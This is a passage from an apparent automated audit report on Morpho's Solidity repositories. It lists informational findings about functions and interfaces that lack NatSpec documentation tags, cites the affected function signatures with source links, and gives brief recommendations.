[3](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L3-L5)

```solidity
📁 File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

5: /// https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol. 
6: interface AggregatorV3Interface {
7:     function decimals() external view returns (uint8);
```
[5](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L5-L7)

```solidity
📁 File: morpho-blue-oracles/src/interfaces/IERC4626.sol

3:  
4: interface IERC4626 {
5:     function convertToAssets(uint256) external view returns (uint256);
```
[3](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L3-L5)

</details>

- Recommendation
- **Add `@author` Tags:** Update the NatSpec comments in the identified files to include the `@author` tag, clearly stating the author or maintainer of each interface or library.
- **Add `@dev` Tags:** Update the NatSpec comments in the identified files to include the `@dev` tag. This tag should provide technical information about the contract, interface, or library, such as its purpose, how it should be used, and any important technical considerations.
- **Add `@notice` Tags:** Update the NatSpec comments in the identified files to include the `@notice` tag. This tag should provide a clear, user-oriented description of what the contract, interface, or library does.
- **Add `@title` Tags:** Update the NatSpec comments in the identified files to include the `@title` tag. This tag should provide a succinct title that encapsulates the main purpose or functionality of the contract, interface, or library.
- **Add NatSpec Description**



### NatSpec: Functions declarations should have @notice, @param and @return tags and NatSpec descriptions

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
NatSpec (Natural Language Specification) is an essential documentation standard in `Solidity Functions`, used primarily for annotating smart contracts. However, numerous functions in the project are missing `@notice` tags, potentially leading to ambiguity regarding their purpose and usage. It employs several tags to enhance understanding and clarity:

1. The `@notice` tag. `@notice` is used to explain to end users what the function does, and the compiler interprets `///` or `/**` comments as this tag if one was't explicitly provided.
2. The `@param` tag. It is recommended that Solidity functions are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation. In complex projects such as DeFi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.
3. The `@return` tag. It is recommended that Solidity functions are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation. In complex projects such as DeFi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.
4. It is recommended that Solidity functions are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation. In complex projects such as DeFi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.

- Instances
**Functions missing `@notice`. `@param` and `@return` tags in their NatSpec comments:**

<details>

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

642:     function _maxDeposit() internal view returns (uint256 totalSuppliable) { 

673:     function _convertToSharesWithTotals( 
674:         uint256 assets,
675:         uint256 newTotalSupply,
676:         uint256 newTotalAssets,
677:         Math.Rounding rounding
678:     ) internal pure returns (uint256) {

684:     function _convertToAssetsWithTotals( 
685:         uint256 shares,
686:         uint256 newTotalSupply,
687:         uint256 newTotalAssets,
688:         Math.Rounding rounding
689:     ) internal pure returns (uint256) {

723:     function _marketParams(Id id) internal view returns (MarketParams memory) { 

742:     function _checkTimelockBounds(uint256 newTimelock) internal pure { 

748:     function _setTimelock(uint256 newTimelock) internal { 

757:     function _setGuardian(address newGuardian) internal { 

766:     function _setCap(Id id, uint184 supplyCap) internal { 

797:     function _supplyMorpho(uint256 assets) internal { 

823:     function _withdrawMorpho(uint256 assets) internal { 

848:     function _simulateWithdrawMorpho(uint256 assets) internal view returns (uint256) { 

895:     function _updateLastTotalAssets(uint256 updatedTotalAssets) internal { 

903:     function _accrueFee() internal returns (uint256 newTotalAssets) { 
```
[642](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L642-L642), [673](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L673-L678), [684](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L684-L689), [723](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L723-L723), [742](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L742-L742), [748](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L748-L748), [757](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L757-L757), [766](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L766-L766), [797](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L797-L797), [823](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L823-L823), [848](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L848-L848), [895](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L895-L895), [903](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L903-L903)

```solidity
📁 File: metamorpho/src/interfaces/IMetaMorpho.sol

19:     function multicall(bytes[] calldata) external returns (bytes[] memory); 

23:     function owner() external returns (address); 
24:     function transferOwnership(address) external;
25:     function renounceOwnership() external;
26:     function acceptOwnership() external;
27:     function pendingOwner() external view returns (address);

33:     function MORPHO() external view returns (IMorpho); 

35:     function curator() external view returns (address); 
36:     function isAllocator(address target) external view returns (bool);
37:     function guardian() external view returns (address);

39:     function fee() external view returns (uint96); 
40:     function feeRecipient() external view returns (address);
41:     function skimRecipient() external view returns (address);
42:     function timelock() external view returns (uint256);
43:     function supplyQueue(uint256) external view returns (Id);
44:     function supplyQueueLength() external view returns (uint256);
45:     function withdrawQueue(uint256) external view returns (Id);
46:     function withdrawQueueLength() external view returns (uint256);

48:     function lastTotalAssets() external view returns (uint256); 

50:     function submitTimelock(uint256 newTimelock) external; 
51:     function acceptTimelock() external;
52:     function revokePendingTimelock() external;

54:     function submitCap(MarketParams memory marketParams, uint256 supplyCap) external; 
55:     function acceptCap(Id id) external;
56:     function revokePendingCap(Id id) external;

58:     function submitMarketRemoval(Id id) external; 
59:     function revokePendingMarketRemoval(Id id) external;

61:     function submitGuardian(address newGuardian) external; 
62:     function acceptGuardian() external;
63:     function revokePendingGuardian() external;

65:     function skim(address) external; 

67:     function setIsAllocator(address newAllocator, bool newIsAllocator) external; 
68:     function setCurator(address newCurator) external;
69:     function setFee(uint256 newFee) external;
70:     function setFeeRecipient(address newFeeRecipient) external;
71:     function setSkimRecipient(address) external;

73:     function setSupplyQueue(Id[] calldata newSupplyQueue) external; 
74:     function updateWithdrawQueue(uint256[] calldata indexes) external;
75:     function reallocate(MarketAllocation[] calldata allocations) external;

81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt); 
82:     function pendingGuardian() external view returns (address guardian, uint64 validAt);
83:     function pendingCap(Id) external view returns (uint192 value, uint64 validAt);
84:     function pendingTimelock() external view returns (uint192 value, uint64 validAt);

92:     function config(Id) external view returns (MarketConfig memory); 
93:     function pendingGuardian() external view returns (PendingAddress memory);
94:     function pendingCap(Id) external view returns (PendingUint192 memory);
95:     function pendingTimelock() external view returns (PendingUint192 memory);
```
[19](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L19), [23](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L23-L27), [33](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L33), [35](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L35-L37), [39](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L39-L46), [48](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L48), [50](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L50-L52), [54](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L54-L56), [58](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L58-L59), [61](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L61-L63), [65](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L65), [67](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L67-L71), [73](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L73-L75), [81](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L81-L84), [92](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L92-L95)

```solidity
📁 File: metamorpho/src/interfaces/IMorphoMarketParams.sol

7:     function idToMarketParams(Id id) external view returns (MarketParams memory marketParams); 
```
[7](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L7)

```solidity
📁 File: morpho-blue-bundlers/src/BaseBundler.sol

65:     function _multicall(bytes[] memory data) internal { 

76:     function _revert(bytes memory returnData) internal pure { 

87:     function _isSenderAuthorized() internal view virtual returns (bool) { 

93:     function _approveMaxTo(address asset, address spender) internal { 
```
[65](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L65-L65), [76](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L76-L76), [87](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L87-L87), [93](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L93-L93)

```solidity
📁 File: morpho-blue-bundlers/src/MorphoBundler.sol

34:     function onMorphoSupply(uint256, bytes calldata data) external { 

39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external { 

44:     function onMorphoRepay(uint256, bytes calldata data) external { 

49:     function onMorphoLiquidate(uint256, bytes calldata data) external { 

54:     function onMorphoFlashLoan(uint256, bytes calldata data) external { 

272:     function _callback(bytes calldata data) internal { 
```
[34](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34-L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39-L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44-L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49-L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54-L54), [272](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L272-L272)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

6:     function nonces(address holder) external view returns (uint256); 

16:     function permit( 
```
[6](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L6), [16](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L16)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IStEth.sol

5:     function transferShares(address _recipient, uint256 _sharesAmount) external returns (uint256); 

7:     function getPooledEthByShares(uint256 _sharesAmount) external view returns (uint256); 

9:     function getSharesByPooledEth(uint256 _stEthAmount) external view returns (uint256); 

11:     function getCurrentStakeLimit() external view returns (uint256); 

13:     function submit(address _referral) external payable returns (uint256); 
```
[5](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L13)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IWNative.sol

5:     function deposit() external payable; 
6:     function withdraw(uint256 wad) external;
7:     function approve(address guy, uint256 wad) external returns (bool);
8:     function transferFrom(address src, address dst, uint256 wad) external returns (bool);
```
[5](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L5-L8)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

5:     function DOMAIN_SEPARATOR() external view returns (bytes32); 

7:     function allowance(address owner, address spender) external view returns (uint256); 
8:     function approve(address spender, uint256 amount) external returns (bool);
9:     function balanceOf(address account) external view returns (uint256);
10:     function decimals() external view returns (uint8);
11:     function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
12:     function getStETHByWstETH(uint256 wstETHAmount) external view returns (uint256);
13:     function getWstETHByStETH(uint256 stETHAmount) external view returns (uint256);
14:     function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
15:     function name() external view returns (string memory);
16:     function nonces(address owner) external view returns (uint256);
17:     function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)

19:     function stETH() external view returns (address); 
20:     function stEthPerToken() external view returns (uint256);
21:     function symbol() external view returns (string memory);
22:     function tokensPerStEth() external view returns (uint256);
23:     function totalSupply() external view returns (uint256);
24:     function transfer(address recipient, uint256 amount) external returns (bool);
25:     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
26:     function unwrap(uint256 wstETHAmount) external returns (uint256);
27:     function wrap(uint256 stETHAmount) external returns (uint256);
```
[5](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L7-L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L19-L27)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

112:     function swapBorrowRateMode(address asset, uint256 rateMode) external; 

133:     function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external; 

197:     function getUserAccountData(address user) 

209:     function initReserve( 

217:     function setReserveInterestRateStrategyAddress(address reserve, address rateStrategyAddress) external; 

219:     function setConfiguration(address reserve, uint256 configuration) external; 

226:     function getReserveNormalizedIncome(address asset) external view returns (uint256); 

233:     function getReserveNormalizedVariableDebt(address asset) external view returns (uint256); 

241:     function getReserveData(address asset) external view returns (ReserveData memory); 

243:     function finalizeTransfer( 

252:     function getReservesList() external view returns (address[] memory); 

254:     function getAddressesProvider() external view returns (address); 

256:     function setPause(bool val) external; 

258:     function paused() external view returns (bool); 

260:     function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256); 
```
[112](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L112), [133](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L133), [197](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L197), [209](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L209), [217](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L217), [219](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L219), [226](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L226), [233](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L233), [241](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L241), [243](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L243), [252](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L252), [254](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L254), [256](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L256), [258](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L258), [260](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L260)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3Optimizer.sol

26:     function DOMAIN_SEPARATOR() external view returns (bytes32); 

28:     function supply(address underlying, uint256 amount, address onBehalf, uint256 maxIterations) 

31:     function supplyWithPermit( 

39:     function supplyCollateral(address underlying, uint256 amount, address onBehalf) 

42:     function supplyCollateralWithPermit( 

50:     function borrow(address underlying, uint256 amount, address onBehalf, address receiver, uint256 maxIterations) 

54:     function repay(address underlying, uint256 amount, address onBehalf) external returns (uint256 repaid); 
55:     function repayWithPermit(

63:     function withdraw(address underlying, uint256 amount, address onBehalf, address receiver, uint256 maxIterations) 

66:     function withdrawCollateral(address underlying, uint256 amount, address onBehalf, address receiver) 

70:     function approveManager(address manager, bool isAllowed) external; 
71:     function approveManagerWithSig(

80:     function liquidate(address underlyingBorrowed, address underlyingCollateral, address user, uint256 amount) 

84:     function claimRewards(address[] calldata assets, address onBehalf) 
```
[26](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L26), [28](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L28), [31](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L31), [39](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L39), [42](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L42), [50](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L50), [54](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L54-L55), [63](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L63), [66](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L66), [70](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L70-L71), [80](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L80), [84](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L84)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

5:     function repayBorrowBehalf(address borrower) external payable; 

7:     function balanceOf(address) external view returns (uint256); 

9:     function exchangeRateStored() external view returns (uint256); 

11:     function redeem(uint256 redeemTokens) external returns (uint256); 

13:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256); 

15:     function borrow(uint256 borrowAmount) external returns (uint256); 

17:     function mint() external payable; 
```
[5](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L17)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

5:     function underlying() external returns (address); 

7:     function balanceOf(address) external view returns (uint256); 

9:     function exchangeRateStored() external view returns (uint256); 

11:     function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256); 

13:     function redeem(uint256 redeemTokens) external returns (uint256); 

15:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256); 

17:     function borrow(uint256 borrowAmount) external returns (uint256); 

19:     function mint(uint256 mintAmount) external returns (uint256); 
```
[5](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L19)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

5:     function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory); 
```
[5](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L5)

```solidity
📁 File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

117:     function _borrowRate(Id id, Market memory market) private view returns (uint256, int256) { 
```
[117](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L117-L117)

```solidity
📁 File: morpho-blue-irm/src/libraries/MathLib.sol

13:     function wMulDown(int256 a, int256 b) internal pure returns (int256) { 

17:     function wDivDown(int256 a, int256 b) internal pure returns (int256) { 
```
[13](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L13-L13), [17](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L17-L17)

```solidity
📁 File: morpho-blue-irm/src/libraries/UtilsLib.sol

11:     function bound(int256 x, int256 low, int256 high) internal pure returns (int256 z) { 
```
[11](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L11-L11)

```solidity
📁 File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

7:     function decimals() external view returns (uint8); 

9:     function description() external view returns (string memory); 

11:     function version() external view returns (uint256); 

13:     function getRoundData(uint80 _roundId) 

18:     function latestRoundData() 
```
[7](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L7), [9](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L9), [11](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L11), [13](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L13), [18](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L18)

```solidity
📁 File: morpho-blue-oracles/src/interfaces/IERC4626.sol

5:     function convertToAssets(uint256) external view returns (uint256); 
```
[5](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L5)

```solidity
📁 File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

31:     function getDecimals(AggregatorV3Interface feed) internal view returns (uint256) { 
```
[31](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L31-L31)

```solidity
📁 File: morpho-blue-oracles/src/libraries/VaultLib.sol

13:     function getAssets(IERC4626 vault, uint256 shares) internal view returns (uint256) { 
```
[13](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L13-L13)

```solidity
📁 File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

183:     function _setRoot(bytes32 newRoot, bytes32 newIpfsHash) internal { 

193:     function _setOwner(address newOwner) internal { 

200:     function _setTimelock(uint256 newTimelock) internal { 
```
[183](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L183-L183), [193](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L193-L193), [200](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L200-L200)

</details>

- Recommendation
- **Add `@notice` Tags:**
- **Add `@param` Tags:**
- **Add `@return` Tags:**
- **Add NatSpec Description**



